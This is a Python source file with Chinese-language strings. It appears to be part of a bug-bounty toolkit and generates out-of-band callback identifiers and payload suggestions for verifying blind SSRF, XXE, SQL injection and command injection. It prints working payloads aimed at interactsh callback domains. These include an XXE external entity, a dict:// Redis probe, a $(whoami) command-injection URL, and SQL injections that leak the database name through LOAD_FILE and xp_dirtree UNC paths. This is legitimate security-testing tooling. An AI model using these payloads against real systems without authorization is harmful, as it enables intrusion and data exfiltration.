"""OOB 外带检测辅助工具 — SSRF/XXE 无回显漏洞验证"""

from typing import Optional


async def bb_oob(
    mode: str = "generate",
    callback_url: Optional[str] = None,
) -> str:
    """
    OOB 外带检测辅助 — 生成回调标识/管理回调

    用于无回显漏洞验证：
    - Blind SSRF
    - Blind XXE
    - Blind SQLi (时间不可靠时)
    - Blind RCE

    Args:
        mode: 模式
            generate - 生成回调标识和 Payload 建议
            help     - OOB 使用说明
        callback_url: 自定义回调地址（如 Burp Collaborator / interactsh）

    Returns:
        OOB 配置信息和 Payload 示例
    """
    import hashlib
    import os
    import json

    if mode == "help":
        result = []
        result.append("=" * 60)
        result.append("OOB (Out-of-Band) 外带检测说明")
        result.append("=" * 60)
        result.append("")
        result.append("OOB 用于检测无回显漏洞：")
        result.append("  1. 获取一个外部可访问的回调地址")
        result.append("  2. 在 Payload 中注入回调地址")
        result.append("  3. 目标服务器访问你的回调地址")
        result.append("  4. 检查回调日志确认漏洞存在")
        result.append("")
        result.append("可用的 OOB 服务：")
        result.append("  ├─ Burp Collaborator (Burp Suite Pro)")
        result.append("  │   https://YOURBURP.burpcollaborator.net")
        result.append("  ├─ interactsh (开源)")
        result.append("  │   https://oast.fun / https://oast.live / https://oast.site")
        result.append("  └─ 自有域名")
        result.append("      配置 DNS 记录，用 tcpdump/ngrok 监听")
        result.append("")
        result.append("SSRF OOB Payload 示例：")
        result.append("  http://YOUR-OOB-DOMAIN/ssrf-test")
        result.append("  http://YOUR-OOB-DOMAIN:8080/$(whoami)")
        result.append("")
        result.append("XXE OOB Payload 示例：")
        result.append('  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR-OOB-DOMAIN/xxe-test">]>')
        result.append("")
        result.append("使用方式：")
        result.append("  bb_oob mode=generate callback_url=https://xxx.oast.fun")
        result.append("  bb_ssrf url=... params=url")
        result.append("  bb_xxe  url=...")
        return "\n".join(result)

    # 生成模式
    unique_id = hashlib.md5(os.urandom(16)).hexdigest()[:12]
    default_callback = callback_url or f"https://{unique_id}.oast.fun"
    custom_tag = f"xuanmu_{unique_id}"

    result = []
    result.append("=" * 60)
    result.append("OOB 回调配置")
    result.append("=" * 60)
    result.append("")
    result.append(f"[*] 唯一标识: {custom_tag}")
    result.append(f"[*] 回调地址: {default_callback}")
    result.append("")
    result.append(f"[SSRF Payload]")
    result.append(f"  http://{unique_id}.oast.fun/ssrf-{custom_tag}")
    result.append(f"  dict://{unique_id}.oast.fun:6379/")
    if callback_url:
        result.append(f"  {callback_url}/test")
    result.append("")
    result.append(f"[XXE Payload]")
    result.append(f'  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{unique_id}.oast.fun/xxe-{custom_tag}">]>')
    result.append(f'  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{unique_id}.oast.fun/xxe-{custom_tag}">]>')
    result.append("")
    result.append(f"[Blind SQLi Payload]")
    result.append(f"  ' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\{unique_id}.oast.fun\\\\\\\\',(SELECT database()))) -- ")
    result.append(f"  '; DECLARE @q NVARCHAR(4000);SET @q='\\\\{unique_id}.oast.fun\\test'; exec master.dbo.xp_dirtree @q; --")
    result.append("")
    result.append("[*] 验证方式：")
    result.append(f"  1. 使用上述 Payload 发送请求")
    if not callback_url:
        result.append(f"  2. 在 https://oast.fun 或 https://app.interactsh.com 检查回调")
    result.append(f"  3. 搜索日志中的 '{custom_tag}' 确认")
    result.append("")
    result.append("[*] 推荐 OOB 服务：")
    result.append("  https://app.interactsh.com  (开源免费)")
    result.append("  https://oast.fun              (社区)")
    result.append("  Burp Collaborator Client      (Burp Pro)")

    return "\n".join(result)
